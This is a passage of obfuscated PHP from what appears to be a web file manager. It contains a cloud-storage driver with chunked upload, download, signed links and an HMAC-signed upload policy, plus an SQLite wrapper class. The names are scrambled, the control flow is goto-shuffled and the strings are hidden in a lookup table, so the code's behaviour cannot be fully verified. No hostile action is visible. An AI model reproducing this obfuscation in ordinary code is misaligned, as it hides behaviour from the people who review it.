$Cğªì°ø†ù[$aÎ‰ñ’ó¬¦[1266]] : array(); foreach ($DÎÙ»áå¤ø as $A´«ã½‘¤‚) { $f‡–Ğšè© = array($aÎ‰ñ’ó¬¦[85] => $a¾ˆ³ Œ‡ . $A´«ã½‘¤‚[$aÎ‰ñ’ó¬¦[38]], $aÎ‰ñ’ó¬¦[86] => $A´«ã½‘¤‚[$aÎ‰ñ’ó¬¦[39]] == $aÎ‰ñ’ó¬¦[86] ? 1 : 0, $aÎ‰ñ’ó¬¦[87] => isset($A´«ã½‘¤‚[$aÎ‰ñ’ó¬¦[334]]) ? $A´«ã½‘¤‚[$aÎ‰ñ’ó¬¦[334]] : 0); $F „„Ù²½ƒ[] = $f‡–Ğšè©; if ($f‡–Ğšè©[$aÎ‰ñ’ó¬¦[86]] == 1) { $this->recursionAllFiles($f‡–Ğšè©[$aÎ‰ñ’ó¬¦[85]], $F „„Ù²½ƒ); } } if (count($DÎÙ»áå¤ø) < $B”ì¬Š¦Ë) { break; } } } public function has($dôôª“¬ÙÙ, $FœÇ¡éö¬¦ = false, $aÃó«›†ªø = true) { goto A•›¸°èù‘; C©‡êÔğé: while (!0) { $F±ïÕ…†ß = $this->fileList($dôôª“¬ÙÙ, $eÃ¶Å·ğŠÑ, $B¸Ş»ß³ù); if (!$F±ïÕ…†ß) { return !1; } $eÃ¶Å·ğŠÑ = isset($F±ïÕ…†ß[$A½Ä£¸ª¶›[1265]]) ? $F±ïÕ…†ß[$A½Ä£¸ª¶›[1265]] : $A½Ä£¸ª¶›[43]; $EæôÃ•·éê = isset($F±ïÕ…†ß[$A½Ä£¸ª¶›[1266]]) ? $F±ïÕ…†ß[$A½Ä£¸ª¶›[1266]] : array(); if (empty($EæôÃ•·éê)) { break; } $Bãá‡ÑŞ¥ª = array_to_keyvalue($EæôÃ•·éê, $A½Ä£¸ª¶›[43], $A½Ä£¸ª¶›[39]); $EŞôÀİŠğÌ = array_count_values($Bãá‡ÑŞ¥ª); $cÙå°£˜İˆ = isset($EŞôÀİŠğÌ[$A½Ä£¸ª¶›[86]]) ? $EŞôÀİŠğÌ[$A½Ä£¸ª¶›[86]] : 0; $Få‘¨ŸÖö = count($Bãá‡ÑŞ¥ª) - $cÙå°£˜İˆ; if ($FœÇ¡éö¬¦) { $eÓ´³Ô–¾¢ += $cÙå°£˜İˆ; $díè„›‡ŞŸ += $Få‘¨ŸÖö; if ($Fåêäí¦ < $B¸Ş»ß³ù) { break; } continue; } if ($aÃó«›†ªø) { if ($Få‘¨ŸÖö) { return !0; } } else { if ($cÙå°£˜İˆ) { return !0; } } if (count($EæôÃ•·éê) < $B¸Ş»ß³ù) { break; } } if ($FœÇ¡éö¬¦) { return array($A½Ä£¸ª¶›[201] => $díè„›‡ŞŸ, $A½Ä£¸ª¶›[202] => $eÓ´³Ô–¾¢); } return !1; goto b¶ÍØ¸Ëë; A•›¸°èù‘: $A½Ä£¸ª¶› =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÃ¶Å·ğŠÑ = $A½Ä£¸ª¶›[43]; $B¸Ş»ß³ù = 1000; goto e††–çä¼´; e††–çä¼´: $díè„›‡ŞŸ = 0; $eÓ´³Ô–¾¢ = 0; $BÈ¶¿ô£‹É = rtrim($dôôª“¬ÙÙ, $A½Ä£¸ª¶›[18]) . $A½Ä£¸ª¶›[18]; goto C©‡êÔğé; b¶ÍØ¸Ëë: } public function listAll($a¨ïĞËãƒË) { $D™¸š‹ÙÏ = array(); $this->recursionAllFiles($a¨ïĞËãƒË, $D™¸š‹ÙÏ); return $D™¸š‹ÙÏ; } public function canRead($d•ëº³ˆÛñ) { return $this->exist($d•ëº³ˆÛñ) ? !0 : !1; } public function canWrite($FË‘…½­ïó) { return $this->exist($FË‘…½­ïó) ? !0 : !1; } public function getContent($E¯ÍÜ¼Ñ) { return $this->fileSubstr($E¯ÍÜ¼Ñ, 0, -1); } public function setContent($a…Ë£ƒ®½¢, $DîŞÃ¶ÃŞÀ = '') { $AÑÌ½¬¹™½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$DîŞÃ¶ÃŞÀ) { $A’ä÷îô‘¶ = $this->ussRequest($a…Ë£ƒ®½¢, $AÑÌ½¬¹™½[222]); return $A’ä÷îô‘¶[$AÑÌ½¬¹™½[1039]]; } $e¶£‹Æå´„ = $this->tempFile($this->pathThis($a…Ë£ƒ®½¢)); file_put_contents($e¶£‹Æå´„, $DîŞÃ¶ÃŞÀ); if ($this->upload($a…Ë£ƒ®½¢, $e¶£‹Æå´„)) { $this->tempFileRemve($e¶£‹Æå´„); return !0; } return !1; } public function fileSubstr($cÍÅâ‚ùåƒ, $E¸‚‹ƒ’Û•, $EÒé­©¼Ù¶) { $D´øö¤çí„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!($D†¡®á‡Ì = $this->link($cÍÅâ‚ùåƒ))) { return !1; } $B”‘­Šš†ğ = !1; if ($EÒé­©¼Ù¶ > 0) { $b§ºáø†–Š = $E¸‚‹ƒ’Û• + $EÒé­©¼Ù¶ - 1; $B”‘­Šš†ğ = array($D´øö¤çí„[1227] . $E¸‚‹ƒ’Û• . $D´øö¤çí„[421] . $b§ºáø†–Š); } $a ø¾µ©æ = url_request($D†¡®á‡Ì, $D´øö¤çí„[226], !1, $B”‘­Šš†ğ); return $a ø¾µ©æ[$D´øö¤çí„[698]] ? $a ø¾µ©æ[$D´øö¤çí„[1041]] : !1; } public function upload($Cò•Œòî¯Ö, $FïôÎÎäÙĞ, $b÷“Ë Şê = false, $DëÒœáÊà» = REPEAT_REPLACE) { goto C×é­äàŒò; EŒä÷„Ò²¶: $B§ÒˆÖƒ = 1024 * 1024 * 10; $FÍÚö§Ä½Ä = array($f«à¤¶’°[1268], $f«à¤¶’°[1269] . $BõìíŸ›’ù, $f«à¤¶’°[1270], $f«à¤¶’°[1271] . $B§ÒˆÖƒ); $d‘æ‚±ÅóØ = $this->ussRequest($Cò•Œòî¯Ö, $f«à¤¶’°[224], !1, $FÍÚö§Ä½Ä); goto Dœ§Òà‚¼¥; BŞõ“®ŒŠ: do { $F¶¸”äîÙÌ = $e¤¼åøõí±[$f«à¤¶’°[1273]]; fseek($DùÒ…ŸÁë™, $AÖóŠˆì”Æ); $BŒæ©Ë¿¡ = fread($DùÒ…ŸÁë™, $F¶¸”äîÙÌ); $DÑ°¢ÏŸà‘ = 0; do { $DÑ°¢ÏŸà‘++; $e¤¼åøõí± = $this->uploadPart($Cò•Œòî¯Ö, $e¤¼åøõí±, $BŒæ©Ë¿¡); } while (!$e¤¼åøõí± && $DÑ°¢ÏŸà‘ < 3); if (!$e¤¼åøõí±) { return !1; } $D‹‡²Ş = $e¤¼åøõí±[$f«à¤¶’°[1272]]; $AÖóŠˆì”Æ += $F¶¸”äîÙÌ; } while ($D‹‡²Ş != -1); fclose($DùÒ…ŸÁë™); $FÍÚö§Ä½Ä = array($f«à¤¶’°[1274], $f«à¤¶’°[1275] . $e¤¼åøõí±[$f«à¤¶’°[1276]], $f«à¤¶’°[1270]); goto EŸïŒ‡®Ê˜; AØ¸ñš™ù¬: $D‹‡²Ş = $e¤¼åøõí±[$f«à¤¶’°[1272]]; $DùÒ…ŸÁë™ = fopen($FïôÎÎäÙĞ, $f«à¤¶’°[1177]); if (!$DùÒ…ŸÁë™) { return !1; } goto BŞõ“®ŒŠ; C×é­äàŒò: $f«à¤¶’° =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BõìíŸ›’ù = IO::size($FïôÎÎäÙĞ); if ($BõìíŸ›’ù <= 1024 * 1024 * 200) { $c–¢®–«›˜ = array($f«à¤¶’°[1267] . $FïôÎÎäÙĞ); $d‘æ‚±ÅóØ = $this->ussRequest($Cò•Œòî¯Ö, $f«à¤¶’°[224], $c–¢®–«›˜); return $d‘æ‚±ÅóØ[$f«à¤¶’°[1039]] ? $this->getPathOuter($Cò•Œòî¯Ö) : !1; } goto EŒä÷„Ò²¶; Dœ§Òà‚¼¥: if (!$d‘æ‚±ÅóØ[$f«à¤¶’°[1039]]) { return !1; } $e¤¼åøõí± = $d‘æ‚±ÅóØ[$f«à¤¶’°[1041]]; $AÖóŠˆì”Æ = 0; goto AØ¸ñš™ù¬; EŸïŒ‡®Ê˜: $d‘æ‚±ÅóØ = $this->ussRequest($Cò•Œòî¯Ö, $f«à¤¶’°[224], !1, $FÍÚö§Ä½Ä); return $d‘æ‚±ÅóØ[$f«à¤¶’°[1039]] ? $this->getPathOuter($A½ì£Õôî) : !1; goto eØï¦Œ×Ä; eØï¦Œ×Ä: } private function uploadPart($F‹õùŠ«ø, $FÆ¼§° ÁÚ, &$eÑÊ×øºª) { $Fó‘ØŒâµŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A†ÄÅêïâŒ = array($Fó‘ØŒâµŒ[1277], $Fó‘ØŒâµŒ[1275] . $FÆ¼§° ÁÚ[$Fó‘ØŒâµŒ[1276]], $Fó‘ØŒâµŒ[1278] . $FÆ¼§° ÁÚ[$Fó‘ØŒâµŒ[1272]], $Fó‘ØŒâµŒ[148] . $FÆ¼§° ÁÚ[$Fó‘ØŒâµŒ[1273]]); $AÂˆ„Æœ = $this->ussRequest($F‹õùŠ«ø, $Fó‘ØŒâµŒ[224], $eÑÊ×øºª, $A†ÄÅêïâŒ); return !$AÂˆ„Æœ[$Fó‘ØŒâµŒ[1039]] ? $AÂˆ„Æœ[$Fó‘ØŒâµŒ[1039]] : $AÂˆ„Æœ[$Fó‘ØŒâµŒ[1041]]; } public function uploadFormData($b°âö¬Ñ ˜, $FóÚ©œ‹Úò = 3600) { return $this->uploadPolicy($b°âö¬Ñ ˜, $FóÚ©œ‹Úò); } public function multiUploadFormData($bŠ°°…Œ, $Bå­¬·õ´ = 3600) { $c‚µ¿ŠŠù³ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d¸‡Á°»îğ = (int) $GLOBALS[$c‚µ¿ŠŠù³[17]][$c‚µ¿ŠŠù³[87]]; return $this->uploadPolicy($bŠ°°…Œ, $Bå­¬·õ´, $d¸‡Á°»îğ); } private function uploadPolicy($FĞà­›îèÒ, $bÔéİÖõ = 3600, $fù©Úê‹µİ = 0) { goto B–ÎöÕÜí±; B–ÎöÕÜí±: $FˆÀ¯³Ï†’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CµÜ·ò×œ¬ = $FˆÀ¯³Ï†’[18] . $this->bucket; $b˜áĞ‹Ğ•‹ = gmdate($FˆÀ¯³Ï†’[1212]); goto eçÅÕ×¬Å¯; eçÅÕ×¬Å¯: $eÃ‹Œ£’íå = array($FˆÀ¯³Ï†’[1279] => $this->bucket, $FˆÀ¯³Ï†’[1280] => $FĞà­›îèÒ, $FˆÀ¯³Ï†’[1281] => time() + $bÔéİÖõ, $FˆÀ¯³Ï†’[1282] => $b˜áĞ‹Ğ•‹); if ($fù©Úê‹µİ) { $eÃ‹Œ£’íå[$FˆÀ¯³Ï†’[1198]] = $fù©Úê‹µİ; } $b„ÊÚ¿ÍÀ = base64_encode(json_encode($eÃ‹Œ£’íå)); goto EÅôªŒ†ï·; EÅôªŒ†ï·: $D¿‚ÏòŞ¡š = base64_encode(hash_hmac($FˆÀ¯³Ï†’[1249], "\x50\117\123\124\x26{$CµÜ·ò×œ¬}\x26{$b˜áĞ‹Ğ•‹}\46{$b„ÊÚ¿ÍÀ}", md5("{$this->userpass}"), !0)); $E­óáèùß’ = array($FˆÀ¯³Ï†’[1119] => $b„ÊÚ¿ÍÀ, $FˆÀ¯³Ï†’[1283] => "\125\x50\x59\x55\x4e\x20{$this->username}\72{$D¿‚ÏòŞ¡š}", $FˆÀ¯³Ï†’[179] => $this->endpoint . $CµÜ·ò×œ¬); return $E­óáèùß’; goto f‘²‡¿–•Ğ; f‘²‡¿–•Ğ: } public function download($AËìŠÄ¸, $FùŠ Â¸Í×) { goto Cœ„»Çßí–; Cœ„»Çßí–: $bÊ½ª¤§´ = IO::getPathInner(IO::mkfile($FùŠ Â¸Í×)); if (!($Bù–¹–©„ë = $this->link($AËìŠÄ¸))) { return !1; } $Bœ™·¯ °Ç = 0; goto D¶ß¡…Œâ¨; dî‰¶¼‚ªÑ: fclose($D¼êçÚïƒß); return $FùŠ Â¸Í×; goto dîéÛÈ¦´Æ; D¶ß¡…Œâ¨: $B¸İÇÃŒÉÆ = 1024 * 200; $D¼êçÚïƒß = fopen($bÊ½ª¤§´, $_SERVER[çŞáÓæÚô‚Ô‡][1233]); while (!0) { $C‹¬¤¦¯‡‘ = $this->fileSubstr($AËìŠÄ¸, $Bœ™·¯ °Ç, $B¸İÇÃŒÉÆ); if ($C‹¬¤¦¯‡‘ === !1) { return !1; } fwrite($D¼êçÚïƒß, $C‹¬¤¦¯‡‘); $Bœ™·¯ °Ç += $B¸İÇÃŒÉÆ; if (strlen($C‹¬¤¦¯‡‘) < $B¸İÇÃŒÉÆ) { break; } } goto dî‰¶¼‚ªÑ; dîéÛÈ¦´Æ: } public function link($BÙÒ¤ç…†­, $F¸Ğ¿•ÙÁ = array()) { $cÁãæ¯…à =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÙÒ¤ç…†­ = trim($BÙÒ¤ç…†­, $cÁãæ¯…à[18]); if (!empty($this->token)) { $FÈŠĞ¡ÅªÑ = strtotime(date($cÁãæ¯…à[1284])); $AÑ¨Ú±©»¬ = substr(md5($this->token . $cÁãæ¯…à[281] . $FÈŠĞ¡ÅªÑ . $cÁãæ¯…à[1285] . $BÙÒ¤ç…†­), 12, 8) . $FÈŠĞ¡ÅªÑ; $F¸Ğ¿•ÙÁ[] = $cÁãæ¯…à[1286] . $AÑ¨Ú±©»¬; } $E—ÃÏ‰Ï×Å = !empty($F¸Ğ¿•ÙÁ) ? $cÁãæ¯…à[79] . implode($cÁãæ¯…à[281], $F¸Ğ¿•ÙÁ) : $cÁãæ¯…à[43]; return $this->getHost() . $cÁãæ¯…à[18] . $BÙÒ¤ç…†­ . $E—ÃÏ‰Ï×Å; } public function fileOut($déÛë¦³­, $eåù‡­§¯¢ = false, $D¨’‡ê­è÷ = false, $AŠáÆÛ‡ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($déÛë¦³­, $eåù‡­§¯¢, $D¨’‡ê­è÷, $AŠáÆÛ‡); } if (!$D¨’‡ê­è÷) { $D¨’‡ê­è÷ = $this->pathThis($déÛë¦³­); } $eÅó˜„Àá = $eåù‡­§¯¢ ? array($_SERVER[çŞáÓæÚô‚Ô‡][1287] . rawurlencode($D¨’‡ê­è÷)) : array(); $bØâ§Ò©å˜ = $this->link($déÛë¦³­, $eÅó˜„Àá); $this->fileOutLink($bØâ§Ò©å˜); } public function fileOutServer($fÂŒîÄàÎ, $béÚÜ‚÷š© = false, $A­£÷»–ó = false, $EŞç½ÄÅé« = '') { parent::fileOut($fÂŒîÄàÎ, $béÚÜ‚÷š©, $A­£÷»–ó, $EŞç½ÄÅé«); } public function fileOutImage($CÍÛçÅÛšÆ, $eåºí¶Šëå = 250) { $F™‘è¶áóâ = $this->link($CÍÛçÅÛšÆ . $_SERVER[çŞáÓæÚô‚Ô‡][1288] . $eåºí¶Šëå); $this->fileOutLink($F™‘è¶áóâ); } public function fileOutImageServer($cŒ”ìƒ¤ãğ, $d¸Á–Ğïóš = 250) { parent::fileOutImage($cŒ”ìƒ¤ãğ, $d¸Á–Ğïóš); } public function hashMd5($Bó—‚†ùè”) { $d ŠŞæ”êÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E†Åà¡¡àâ = $this->objectMeta($Bó—‚†ùè”); return isset($E†Åà¡¡àâ[$d ŠŞæ”êÀ[206]]) ? $E†Åà¡¡àâ[$d ŠŞæ”êÀ[206]] : !1; } public function size($AåÌÆŸ•†ã) { $e¬ÆÄ‰Îëœ = $this->objectMeta($AåÌÆŸ•†ã); return $e¬ÆÄ‰Îëœ ? $e¬ÆÄ‰Îëœ[$_SERVER[çŞáÓæÚô‚Ô‡][87]] : 0; } public function info($fÃë…æÓÇ¹) { if ($this->isFolder($fÃë…æÓÇ¹)) { return $this->folderInfo($fÃë…æÓÇ¹); } else { if ($this->isFile($fÃë…æÓÇ¹)) { return $this->fileInfo($fÃë…æÓÇ¹); } } return !1; } public function exist($E—®£‘‡âÒ) { return $this->isFile($E—®£‘‡âÒ) || $this->isFolder($E—®£‘‡âÒ); } public function isFile($CÜ¦çİÖ) { return !$this->isFolder($CÜ¦çİÖ) && $this->objectMeta($CÜ¦çİÖ); } public function isFolder($fèÆóÀ¥²ø) { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][232], $fèÆóÀ¥²ø); } protected function objectMeta($CÅùšù˜‡÷) { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][233], $CÅùšù˜‡÷); } protected function _objectMeta($AÔî‘ŠÖ‰) { goto AÍğî×ÉŸª; AÍğî×ÉŸª: $AÂæ’†•ìò =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($AÔî‘ŠÖ‰ == $AÂæ’†•ìò[43] || $AÔî‘ŠÖ‰ == $AÂæ’†•ìò[18]) { return array(); } $aÄ”½î¨®‹ = $this->ussRequest($AÔî‘ŠÖ‰, $AÂæ’†•ìò[1289]); goto d‡ã™¯…; d‡ã™¯…: if (!$aÄ”½î¨®‹[$AÂæ’†•ìò[1039]]) { return null; } $c—ˆˆ±¯‘“ = isset($aÄ”½î¨®‹[$AÂæ’†•ìò[1041]]) ? $aÄ”½î¨®‹[$AÂæ’†•ìò[1041]] : array(); if (!isset($c—ˆˆ±¯‘“[$AÂæ’†•ìò[1290]])) { return null; } goto B•Ã²ÏÔÓ¿; B•Ã²ÏÔÓ¿: $aÁÚè…¯ = array($AÂæ’†•ìò[38] => get_path_this($AÔî‘ŠÖ‰), $AÂæ’†•ìò[39] => isset($c—ˆˆ±¯‘“[$AÂæ’†•ìò[1290]]) ? $c—ˆˆ±¯‘“[$AÂæ’†•ìò[1290]] : null, $AÂæ’†•ìò[87] => isset($c—ˆˆ±¯‘“[$AÂæ’†•ìò[1291]]) ? $c—ˆˆ±¯‘“[$AÂæ’†•ìò[1291]] : null, $AÂæ’†•ìò[206] => isset($c—ˆˆ±¯‘“[$AÂæ’†•ìò[1292]]) ? $c—ˆˆ±¯‘“[$AÂæ’†•ìò[1292]] : null, $AÂæ’†•ìò[1260] => isset($c—ˆˆ±¯‘“[$AÂæ’†•ìò[1293]]) ? $c—ˆˆ±¯‘“[$AÂæ’†•ìò[1293]] : null); $aÁÚè…¯[$AÂæ’†•ìò[1261]] = isset($c—ˆˆ±¯‘“[$AÂæ’†•ìò[1294]]) ? strtotime($c—ˆˆ±¯‘“[$AÂæ’†•ìò[1294]]) : $aÁÚè…¯[$AÂæ’†•ìò[1260]]; return $aÁÚè…¯; goto C·Œã´¦×Š; C·Œã´¦×Š: } protected function _isFolder($F¯ùâë™¡½) { $Fë§ŠøÊñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($F¯ùâë™¡½ == $Fë§ŠøÊñ[43] || $F¯ùâë™¡½ == $Fë§ŠøÊñ[18]) { return !0; } $CêêÀƒÌ™ = $this->objectMeta($F¯ùâë™¡½); return isset($CêêÀƒÌ™[$Fë§ŠøÊñ[39]]) && $CêêÀƒÌ™[$Fë§ŠøÊñ[39]] == $Fë§ŠøÊñ[86] ? !0 : !1; } } goto Bá¿ÑŸ©‘; Eò”ƒÇáåŒ: class DbSqlite3Base extends Db { public function __construct($BĞÓ‘ÖŞÚ = '') { $e¶ÊÒÜàÒ¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!class_exists($e¶ÊÒÜàÒ¾[61])) { think_exception(think_lang($e¶ÊÒÜàÒ¾[20]) . $e¶ÊÒÜàÒ¾[62]); } if (!empty($BĞÓ‘ÖŞÚ)) { if (!isset($BĞÓ‘ÖŞÚ[$e¶ÊÒÜàÒ¾[22]])) { $BĞÓ‘ÖŞÚ[$e¶ÊÒÜàÒ¾[22]] = 438; } $this->config = $BĞÓ‘ÖŞÚ; if (empty($this->config[$e¶ÊÒÜàÒ¾[23]])) { $this->config[$e¶ÊÒÜàÒ¾[23]] = array(); } } } public function connect($CÊ”ŒñÈª¯ = '', $dÌ¿¯¸Ïî = 0) { $f¸¢¢Á½‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($this->linkID[$dÌ¿¯¸Ïî])) { if (empty($CÊ”ŒñÈª¯)) { $CÊ”ŒñÈª¯ = $this->config; } $this->linkID[$dÌ¿¯¸Ïî] = new SQLite3($CÊ”ŒñÈª¯[$f¸¢¢Á½‰[27]]); if (!$this->linkID[$dÌ¿¯¸Ïî]) { think_exception($this->linkID[$dÌ¿¯¸Ïî]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$dÌ¿¯¸Ïî]->busyTimeout(30000); if (1 != think_config($f¸¢¢Á½‰[28])) { unset($this->config); } } return $this->linkID[$dÌ¿¯¸Ïî]; } public function free() { $this->queryID = null; } public function query($AùÌ–Ó´è™) { goto AÊƒ¯Î¹Ï³; FóäÌÍÅ‡È: think_status($CĞ’ÉÒÌ[30]); $this->queryID = $this->_linkID->query($AùÌ–Ó´è™); $this->debug(); goto d‘Ë¸šŒÁ; AÊƒ¯Î¹Ï³: $CĞ’ÉÒÌ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F½ì‘ÔŸÍÚ; F½ì‘ÔŸÍÚ: $this->queryStr = $AùÌ–Ó´è™; if ($this->queryID) { $this->free(); } think_action_status($CĞ’ÉÒÌ[29], 1); goto FóäÌÍÅ‡È; d‘Ë¸šŒÁ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $b‰¢‡ĞÍ Ü = $this->getAll(); $this->numRows = count($b‰¢‡ĞÍ Ü); return $b‰¢‡ĞÍ Ü; } goto DÖ¯”òõÍ¹; DÖ¯”òõÍ¹: } public function execute($bÇÆÀƒˆ) { goto FöÛğ™êÜ‘; E£Ì·ÛŞÈ: $this->queryStr = $bÇÆÀƒˆ; if ($this->queryID) { $this->free(); } think_action_status($a¹“òÇÜšÔ[31], 1); goto D´½¿˜ö÷·; D´½¿˜ö÷·: think_status($a¹“òÇÜšÔ[30]); $dâ¼ÊË = $this->_linkID->exec($bÇÆÀƒˆ); $this->debug(); goto E’„ãÇÎ†Á; E’„ãÇÎ†Á: if (!1 === $dâ¼ÊË) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto F˜áãœø¦²; FöÛğ™êÜ‘: $a¹“òÇÜšÔ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E£Ì·ÛŞÈ; F˜áãœø¦²: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[çŞáÓæÚô‚Ô‡][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cé…îò³ŞĞ = $this->_linkID->query($_SERVER[çŞáÓæÚô‚Ô‡][33]); if (!$Cé…îò³ŞĞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A„ùÛ¯ïÌÂ = $this->_linkID->query($_SERVER[çŞáÓæÚô‚Ô‡][34]); if (!$A„ùÛ¯ïÌÂ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FÇë¤§«¾® = array(); while ($cØĞ¤Ø‚ø = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $FÇë¤§«¾®[] = $cØĞ¤Ø‚ø; } $this->queryID->reset(); return $FÇë¤§«¾®; } public function getFields($C„òö¦ãÊ) { $Dé±ŞÒ”±ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¥§ğ§„‡ë = $this->query($Dé±ŞÒ”±ë[35] . $C„òö¦ãÊ . $Dé±ŞÒ”±ë[36]); $D¼ŒË¾ŠÑ‚ = array(); if ($D¥§ğ§„‡ë) { foreach ($D¥§ğ§„‡ë as $Eëå’¶’ŸÀ => $AÜ‘ï‡•ğ†) { $D¼ŒË¾ŠÑ‚[$AÜ‘ï‡•ğ†[$Dé±ŞÒ”±ë[38]]] = array($Dé±ŞÒ”±ë[38] => $AÜ‘ï‡•ğ†[$Dé±ŞÒ”±ë[38]], $Dé±ŞÒ”±ë[39] => $AÜ‘ï‡•ğ†[$Dé±ŞÒ”±ë[39]], $Dé±ŞÒ”±ë[41] => (bool) ($AÜ‘ï‡•ğ†[$Dé±ŞÒ”±ë[41]] === $Dé±ŞÒ”±ë[43]), $Dé±ŞÒ”±ë[44] => $AÜ‘ï‡•ğ†[$Dé±ŞÒ”±ë[63]], $Dé±ŞÒ”±ë[46] => (bool) $AÜ‘ï‡•ğ†[$Dé±ŞÒ”±ë[64]], $Dé±ŞÒ”±ë[49] => (bool) $AÜ‘ï‡•ğ†[$Dé±ŞÒ”±ë[64]]); } } return $D¼ŒË¾ŠÑ‚; } public function getTables($E£ù†ò÷¾· = '') { $dóÀŸŸµˆ‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F™±÷ğˆ¼ = $this->query($dóÀŸŸµˆ‹[52] . $dóÀŸŸµˆ‹[53] . $dóÀŸŸµˆ‹[54]); $eâ±ÑÕå = array(); foreach ($F™±÷ğˆ¼ as $D‘¨ÀŸ¥Ø => $AˆÅàè™»°) { $eâ±ÑÕå[$D‘¨ÀŸ¥Ø] = current($AˆÅàè™»°); } return $eâ±ÑÕå; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e·Ş¹óé§¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->error = $this->_linkID->lastErrorMsg(); if ($e·Ş¹óé§¥[43] != $this->queryStr) { $this->error .= LNG($e·Ş¹óé§¥[55]) . $this->queryStr; } think_trace($this->error, $e·Ş¹óé§¥[43], $e·Ş¹óé§¥[56]); return $this->error; } public function escapeString($dñÒÒ±æË) { $fšŠ‘”ƒ£è =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->_linkID) { return $this->_linkID->escapeString($dñÒÒ±æË); } return str_ireplace($fšŠ‘”ƒ£è[65], $fšŠ‘”ƒ£è[66], $dñÒÒ±æË); } public function parseLimit($EÅİ¬¶¹§¶) { $b¾«‹…šà =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A³“…»ù˜ó = $b¾«‹…šà[43]; if (!empty($EÅİ¬¶¹§¶)) { $EÅİ¬¶¹§¶ = explode($b¾«‹…šà[57], $EÅİ¬¶¹§¶); if (count($EÅİ¬¶¹§¶) > 1) { $A³“…»ù˜ó .= $b¾«‹…šà[58] . $EÅİ¬¶¹§¶[1] . $b¾«‹…šà[59] . $EÅİ¬¶¹§¶[0] . $b¾«‹…šà[60]; } else { $A³“…»ù˜ó .= $b¾«‹…šà[58] . $EÅİ¬¶¹§¶[0] . $b¾«‹…šà[60]; } } return $A³“…»ù˜ó; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $d™¬Ÿ¸ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->objectDriver = array($d™¬Ÿ¸ß[67], $d™¬Ÿ¸ß[68], $d™¬Ÿ¸ß[69], $d™¬Ÿ¸ß[70], $d™¬Ÿ¸ß[71], $d™¬Ÿ¸ß[72], $d™¬Ÿ¸ß[73], $d™¬Ÿ¸ß[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($e¹Í‰¬ŸÙ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($e¹Í‰¬ŸÙ, $_SERVER[çŞáÓæÚô‚Ô‡][18]); } return $e¹Í‰¬ŸÙ; } public function getPathName($bßÃÊË„É) { return $bßÃÊË„É; } public function iconvApp($C¹‚“à‡…¸) { return $C¹‚“à‡…¸; } public function iconvSystem($e¶á®…Ñ×‰) { return $e¶á®…Ñ×‰; } public function iconvTo($eÓ†ğŒÎä, $C‰¡õéÌùØ, $dëèÆó¡ë) { goto e†äê‡ëó™; cëæ™ÍäÍ: return $aƒ¡ëĞ‘; goto f¯Üñ„¾ëí; eòË™ßí¾Š: $aƒ¡ëĞ‘ = $aƒ¡ëĞ‘ ? $aƒ¡ëĞ‘ : $eÓ†ğŒÎä; if (strstr($aƒ¡ëĞ‘, $Cšå÷¤Úæ¯[79])) { $aƒ¡ëĞ‘ = str_replace($Cšå÷¤Úæ¯[79], $Cšå÷¤Úæ¯[80], $aƒ¡ëĞ‘); } $D†ğîğ‰±[$C‰¡õéÌùØ . $Cšå÷¤Úæ¯[76] . $dëèÆó¡ë . $Cšå÷¤Úæ¯[77] . $eÓ†ğŒÎä] = $aƒ¡ëĞ‘; goto BÌÀ‡ˆÅÁß; E éî‰Ü’À: $Fˆ“‚ùŠ° = $C‰¡õéÌùØ . $Cšå÷¤Úæ¯[76] . $dëèÆó¡ë . $Cšå÷¤Úæ¯[77] . $eÓ†ğŒÎä; if (isset($D†ğîğ‰±[$Fˆ“‚ùŠ°])) { return $D†ğîğ‰±[$Fˆ“‚ùŠ°]; } if (function_exists($Cšå÷¤Úæ¯[78])) { $aƒ¡ëĞ‘ = @mb_convert_encoding($eÓ†ğŒÎä, $dëèÆó¡ë, $C‰¡õéÌùØ); } else { $aƒ¡ëĞ‘ = @iconv($C‰¡õéÌùØ, $dëèÆó¡ë, $eÓ†ğŒÎä); } goto eòË™ßí¾Š; e†äê‡ëó™: $Cšå÷¤Úæ¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$eÓ†ğŒÎä || !function_exists($Cšå÷¤Úæ¯[75])) { return 